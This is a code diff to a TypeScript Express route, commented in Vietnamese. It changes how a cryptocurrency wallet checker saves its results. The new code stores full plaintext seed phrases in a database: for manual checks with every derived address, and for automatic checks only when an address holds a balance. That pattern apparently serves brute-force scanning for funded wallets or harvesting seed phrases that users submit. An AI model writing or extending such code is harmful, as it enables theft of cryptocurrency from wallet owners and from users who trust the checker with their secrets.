@@ -230,9 +230,12 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // - Nếu là kiểm tra thủ công: lưu TẤT CẢ địa chỉ (kể cả không có số dư)
       // - Nếu là kiểm tra tự động: chỉ lưu địa chỉ có số dư
       if (seedPhrase) {
-        for (const result of results) {
-          // Lưu nếu là kiểm tra thủ công HOẶC (là kiểm tra tự động VÀ có số dư)
-          if (isManualCheck || result.hasBalance) {
+        // Nếu là kiểm tra thủ công, chúng ta sẽ lưu seed phrase này
+        if (isManualCheck) {
+          console.log(`Đang lưu seed phrase thủ công với ${results.length} địa chỉ`);
+          
+          // Với kiểm tra thủ công, lưu tất cả địa chỉ kể cả không có số dư
+          for (const result of results) {
             try {
               await storage.createWallet({
                 blockchain: result.blockchain,
@@ -240,12 +243,36 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 balance: result.balance,
                 seedPhrase: seedPhrase,
                 path: "",
-                isManualCheck: isManualCheck,
+                isManualCheck: true, // Đánh dấu là thủ công
                 metadata: {},
               });
             } catch (dbError) {
-              console.error("Error saving wallet to database:", dbError);
+              console.error(`Error saving manual wallet (${result.blockchain}) to database:`, dbError);
               // Tiếp tục ngay cả khi lưu DB thất bại
+            }
+          }
+        } 
+        // Nếu là kiểm tra tự động, chỉ lưu địa chỉ có số dư
+        else {
+          const balanceAddresses = results.filter(r => r.hasBalance);
+          if (balanceAddresses.length > 0) {
+            console.log(`Đang lưu ${balanceAddresses.length} địa chỉ có số dư từ kiểm tra tự động`);
+            
+            for (const result of balanceAddresses) {
+              try {
+                await storage.createWallet({
+                  blockchain: result.blockchain,
+                  address: result.address,
+                  balance: result.balance,
+                  seedPhrase: seedPhrase,
+                  path: "",
+                  isManualCheck: false, // Đánh dấu là tự động
+                  metadata: {},
+                });
+              } catch (dbError) {
+                console.error(`Error saving auto wallet (${result.blockchain}) with balance to database:`, dbError);
+                // Tiếp tục ngay cả khi lưu DB thất bại
+              }
             }
           }
         }
